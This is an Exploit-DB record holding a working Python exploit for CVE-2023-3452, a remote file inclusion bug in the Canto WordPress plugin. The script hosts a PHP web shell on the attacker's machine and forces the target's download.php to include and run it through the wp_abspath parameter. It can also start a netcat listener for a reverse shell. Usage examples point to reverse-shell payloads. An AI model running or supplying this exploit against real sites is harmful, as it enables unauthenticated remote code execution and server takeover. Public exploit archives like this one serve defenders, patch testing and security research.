{"source": "https://www.exploit-db.com/exploits/51826", "vulnName": "Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)", "vulnEDBID": "51826", "vulnCVE": "N/A", "author": "LEOPOLDO ANGULO (LEOANGGAL1)", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-27", "vulnContent": "# Exploit Title: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)\n# Date: 04/11/2023\n# Exploit Author: Leopoldo Angulo (leoanggal1)\n# Vendor Homepage: https://wordpress.org/plugins/canto/\n# Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip\n# Version: All versions of Canto Plugin prior to 3.0.5\n# Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4\n# CVE : CVE-2023-3452\n\n#PoC Notes:\n#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)\n#This code exploits the improper handling of the wp_abspath variable in the following line of the \"download.php\" code:\n#... require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php'); ...\n#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.\n# More information in Leoanggal1's Github\n\n#!/usr/bin/python3\nimport argparse\nimport http.server\nimport socketserver\nimport threading\nimport requests\nimport os\nimport subprocess\n\n# Define the default web shell\ndefault_web_shell = \"<?php system($_GET['cmd']); ?>\"\n\ndef create_admin_file(local_dir, local_shell=None):\n    if not os.path.exists(local_dir):\n        os.makedirs(local_dir)\n\n    # If a local shell is provided, use it; otherwise, use the default web shell\n    if local_shell:\n        with open(f\"{local_dir}/admin.php\", \"wb\") as admin_file:\n            with open(local_shell, \"rb\") as original_file:\n                admin_file.write(original_file.read())\n    else:\n        with open(f\"{local_dir}/admin.php\", \"w\") as admin_file:\n            admin_file.write(default_web_shell)\n\ndef start_local_server(local_port):\n    Handler = http.server.SimpleHTTPRequestHandler\n    httpd = socketserver.TCPServer((\"0.0.0.0\", local_port), Handler)\n\n    print(f\"Local web server on port {local_port}...\")\n    httpd.serve_forever()\n\n    return httpd\n\ndef exploit_rfi(url, local_shell, local_host, local_port, command, nc_port):\n    local_dir = \"wp-admin\"\n    create_admin_file(local_dir, local_shell)\n\n    target_url = f\"{url}/wp-content/plugins/canto/includes/lib/download.php\"\n    local_server = f\"http://{local_host}:{local_port}\"\n    command = f\"cmd={command}\"\n\n    if local_shell:\n        # If a local shell is provided, start netcat on the specified port\n        subprocess.Popen([\"nc\", \"-lvp\", str(nc_port)])\n\n    server_thread = threading.Thread(target=start_local_server, args=(local_port,))\n    server_thread.daemon = True\n    server_thread.start()\n\n    exploit_url = f\"{target_url}?wp_abspath={local_server}&{command}\"\n    print(f\"Exploitation URL: {exploit_url}\")\n\n    response = requests.get(exploit_url)\n    print(\"Server response:\")\n    print(response.text)\n\n    # Shutdown the local web server\n    print(\"Shutting down local web server...\")\n    server_thread.join()\n\nif __name__ == \"__main__\":\n    examples = '''\n    Examples:\n    - Check the vulnerability\n    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33\n\n    - Execute a command\n    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'\n\n    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.\n    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php\n    '''\n    parser = argparse.ArgumentParser(description=\"Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452\", epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)\n    parser.add_argument(\"-u\", \"--url\", required=True, default=None,  help=\"Vulnerable URL\")\n    parser.add_argument(\"-s\", \"--shell\", help=\"Local file for web shell\")\n    parser.add_argument(\"-LHOST\", \"--local_host\", required=True, help=\"Local web server IP\")\n    parser.add_argument(\"-LPORT\", \"--local_port\", help=\"Local web server port\")\n    parser.add_argument(\"-c\", \"--command\", default=\"whoami\", help=\"Command to execute on the target\")\n    parser.add_argument(\"-NC_PORT\", \"--nc_port\", type=int, help=\"Listener port for netcat\")\n\n    try:\n        args = parser.parse_args()\n\n        if args.local_port is None:\n            args.local_port = 8080  # Valor predeterminado si LPORT no se proporciona\n        exploit_rfi(args.url, args.shell, args.local_host, int(args.local_port), args.command, args.nc_port)\n\n    except SystemExit:\n        parser.print_help()\n            "}